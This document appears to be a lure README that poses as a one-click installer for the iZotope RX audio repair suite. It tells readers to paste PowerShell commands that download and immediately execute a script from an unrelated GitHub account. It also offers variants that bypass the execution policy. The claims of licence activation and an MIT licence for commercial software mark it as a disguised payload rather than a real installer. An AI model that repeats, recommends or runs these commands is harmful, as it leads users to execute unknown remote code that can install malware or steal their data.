# iZotope RX Audio Repair Setup
One-click setup for iZotope RX Audio Repair Setup -- the industry-standard AI audio repair suite used in film, TV, and podcast production to remove noise, hum, reverb, and background voices from any recording

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What It Does

- Installs iZotope RX as a standalone editor and as VST3, AAX, and AU plugins for all major DAWs.
- Downloads the full AI model library for dialogue isolation, noise removal, and spectral repair modules.
- Activates the license via iZotope account and enables Music Rebalance, Ambience Match, and Repair Assistant.
- Opens RX with a sample noisy recording to demonstrate the one-click repair workflow and output quality.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~3000 MB free disk space

## Troubleshooting

**Dialogue Isolation removes too much room tone and leaves the voice sounding thin and over-processed**

Lower the Isolation Amount to 60 percent and blend with the original using the Wet/Dry control in the module.

**Music Rebalance cannot cleanly separate instruments when multiple elements share the same frequency range**

Apply Spectral Recovery first to restore transients, then run Music Rebalance with Fine Detail sensitivity mode enabled.

**Bypass execution policy (alternative):**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1)"
```

"irm is not recognized" -- use the expanded syntax on older PowerShell:

```powershell
Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1')
```

## License
MIT -- see LICENSE.